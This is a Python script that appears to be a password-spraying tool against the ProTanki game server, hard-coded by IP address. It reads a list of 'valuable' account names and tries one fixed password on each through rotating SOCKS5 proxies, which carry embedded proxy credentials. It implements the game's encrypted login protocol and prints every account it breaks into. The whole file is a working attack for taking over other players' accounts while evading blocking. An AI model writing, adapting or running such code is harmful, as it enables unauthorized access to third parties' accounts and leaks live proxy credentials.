import os
import sys
import socks
from threading import Thread, Lock, Event
import queue
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))  # To access src/
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'lib')))  # To access modules within src/lib/

from lib.modules.packetmanager import packetManager

from lib.utils.address import Address
from lib.modules.protection import Protection
from lib.packets import AbstractPacket
from lib.utils.ebytearray import EByteArray

data_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'data'))
proxies_path = os.path.join(data_path, 'proxies.txt')
accounts_path = os.path.join(data_path, 'valuablenicks.txt')


class Allocator:
    lock: Lock
    accounts: list[str]
    checkout_count: int

    def __init__(self, accounts: list[str]):
        self.lock = Lock()
        self.accounts = accounts
        self.account_count = len(accounts)
        self.checkout_count = 0
        self.account_count = len(accounts)

    def get_account(self):
        with self.lock:
            if len(self.accounts) > 0:
                return self.accounts.pop(0)
            return ""
        
    def checkout(self, account: str, failure = False):
        with self.lock:
            if failure:
                self.accounts.append(account)
            else:
                self.checkout_count += 1

    @property
    def check_finish(self):
        with self.lock:
            return self.checkout_count == self.account_count


class NameSocket:
    ENDPOINT = Address("146.59.110.146", 1337)  # core-protanki.com

    last_processed_packet: AbstractPacket

    def __init__(self, id: int, proxy: Address, allocator: Allocator, new_socket: callable):
        self.id = id
        self.allocator = allocator
        self.new_socket = new_socket

        if not self.get_account():
            return

        self.protection = Protection()
        self.proxy = proxy

        self.init_socket()

        Thread(target=self.loop, daemon=True).start()

    def init_socket(self):
        self.socket = None
        self.socket = socks.socksocket(socks.socket.AF_INET, socks.socket.SOCK_STREAM)
        self.socket.set_proxy(socks.PROXY_TYPE_SOCKS5, self.proxy.host, self.proxy.port, username=self.proxy.username, password=self.proxy.password)

    def loop(self):
        try:
            self.socket.connect(self.ENDPOINT.split_args)
        except Exception as e:
            #print(f"{self.id} Proxy Error: {e} | {self.proxy}")
            self.checkout(True)
            return

        while True:
            try:
                packet_len = 0
                packet_id = 0
                packet_len_bytes = EByteArray(self.socket.recv(4))
                if len(packet_len_bytes) == 0:
                    raise Exception("Disconnected")
                packet_len = packet_len_bytes.read_int()
                packet_id_bytes = EByteArray(self.socket.recv(4))
                if len(packet_id_bytes) == 0:
                    raise Exception("Disconnected")
                packet_id = packet_id_bytes.read_int()

                packet_data_len = packet_len - AbstractPacket.HEADER_LEN
                encrypted_data = EByteArray()

                if packet_data_len > 0:
                    # Load chunked data into the socket buffer until we have all the data to read
                    while len(encrypted_data) != packet_data_len:
                        remaining_size = packet_data_len - len(encrypted_data)
                        received_data = EByteArray(self.socket.recv(remaining_size))
                        if len(received_data) == 0:
                            raise Exception("Disconnected")
                        encrypted_data += received_data

                packet_data = self.protection.decrypt(encrypted_data)
                self.parse_packet(packet_id, EByteArray(packet_data))

            except Exception as e:
                #print(f"{self.id} Error: {e} | {packet_len} {packet_id}")
                self.checkout(True)
                return
            
    def parse_packet(self, packet_id: int, packet_data: EByteArray):
        Packet = packetManager.get_packet(packet_id)
        if Packet is None:
            return
        self.last_processed_packet = Packet()
        packet_object = self.last_processed_packet.unwrap(packet_data)

        if self.compare_packet("Activate_Protection"):
            self.protection.activate(packet_object['keys'])

        elif self.compare_packet('Set_Captcha_Keys'):
            client_lang_packet = packetManager.get_packet_by_name('Set_Client_Lang')()
            client_lang_packet.objects = ['en']
            self.socket.sendall(client_lang_packet.wrap(self.protection))

        elif self.compare_packet('Ping'):
            pong_packet = packetManager.get_packet_by_name('Pong')()
            self.socket.sendall(pong_packet.wrap(self.protection))

        elif self.compare_packet('Load_Resources'):
            loaded_packet = packetManager.get_packet_by_name('Resources_Loaded')()
            loaded_packet.objects = [packet_object['callbackID']]  # Lazy deimplement
            self.socket.sendall(loaded_packet.wrap(self.protection))
        
        elif self.compare_packet("Login_Ready"):
            packet = packetManager.get_packet_by_name("Login")()
            packet.object = {
                "username": self.account,
                "password": "skibiditoilet",
                "rememberMe": False
            }
            packet.deimplement()
            self.socket.sendall(packet.wrap(self.protection))

        elif self.compare_packet("Login_Success"):
            self.checkout()
            time.sleep(1)

        elif self.compare_packet("Login_Failed"):
            self.checkout(True)
            time.sleep(1)

    def get_account(self):
        self.account = self.allocator.get_account()
        if self.account == "":
            return False
        return True

    def checkout(self, failure = False):
        self.allocator.checkout(self.account, failure)        
        if failure:
            #print(f"{self.id} ({self.proxy}) could not login to {self.account}")
            pass
        else:
            #print(f"{self.id} ({self.proxy}) logged in to {self.account}")
            print(self.account, end="\n")

        self.socket.close()

        #time.sleep(6)
        #self.new_socket(self)

    def compare_packet(self, packet_name: str):
        return self.last_processed_packet.__class__.__name__ == packet_name

        
if __name__ == "__main__":
    with open(accounts_path, 'r') as f:
        accounts = f.read().splitlines()

        print(f"Loaded {len(accounts)} Accounts.")

    # Read each line from the proxies file until the first character is not a digit
    proxies = []
    with open(proxies_path, 'r') as f:
        for line in f:
            stripped_line = line.strip()
            if stripped_line[0].isdigit():
                ip, port = stripped_line.split(':')
                proxies.append(Address(ip, int(port), username="twjyikvd", password="yfp7nkalj1mq"))
            else:
                break

        print(f"Loaded {len(proxies)} Proxies.")
    
    allocator = Allocator(accounts)
    sockets: set[NameSocket] = set()
    socket_lock = Lock()

    def new_socket(socket: NameSocket):
        #other_socket = NameSocket(socket.id + 100, socket.proxy, allocator, new_socket)
        with socket_lock:
            sockets.remove(socket)
            #sockets.add(other_socket)

    for i, proxy in enumerate(proxies):
        with socket_lock:
            sockets.add(NameSocket(i, proxy, allocator, new_socket))

    while not allocator.check_finish:
        time.sleep(2)
        #print(f"Progress: {allocator.checkout_count}/{allocator.account_count}")
    print("Finished")
